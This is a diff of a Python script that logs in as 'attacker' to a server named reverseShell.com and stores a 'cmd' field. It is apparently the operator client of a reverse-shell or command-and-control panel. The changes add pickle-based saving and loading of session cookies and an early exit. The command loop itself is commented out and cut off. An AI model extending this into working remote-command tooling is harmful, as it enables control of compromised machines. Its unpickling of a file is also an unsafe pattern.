@@ -1,8 +1,24 @@
 import requests
 import logging
+import pickle
 
 def login(session, url, type):
     return session.request('GET', url, {'login':1, 'type':type})
+
+# Try to load session cookies from file
+def tryToLoadSessionCookies(session):
+    # Try to load session cookies from file
+    try:
+        with open('cookies.dat', 'rb') as f:
+            session.cookies.update(pickle.load(f))
+    except FileNotFoundError:
+        pass
+
+# Save session cookies to file:
+def writeSessionCookiesToFile(session):
+    # Write cookies to file
+    with open('cookies.dat', 'wb') as f:
+        pickle.dump(session.cookies, f)
 
 
 def main():
@@ -10,21 +26,27 @@ def main():
     logging.basicConfig(level=logging.DEBUG)
 
     # Server domain
-    base_url = 'http://www.reverseShell.com'
+    baseUrl = 'http://www.reverseShell.com'
 
     # Store command
     data = {'cmd': None}
 
     # Start session
     with requests.session() as s:
-        s.cookies.set('PHPSESSID','1c5afa5bfe47e48f5c75aa349c497b5d')
-        print(s.cookies)
+        # Try to load session cookies from file
+        tryToLoadSessionCookies(s)
+
         # Log in as attacker
-        response = login(s, base_url + '/login.php', 'attacker')
+        response = login(s, baseUrl + '/login.php', 'attacker')
+
+        # Save session cookies to file
+        writeSessionCookiesToFile(s)
 
         #print(s.cookies.get_dict())
         #print(response.content)
         print(response.text)
+
+        exit()
 
         '''
         while True:
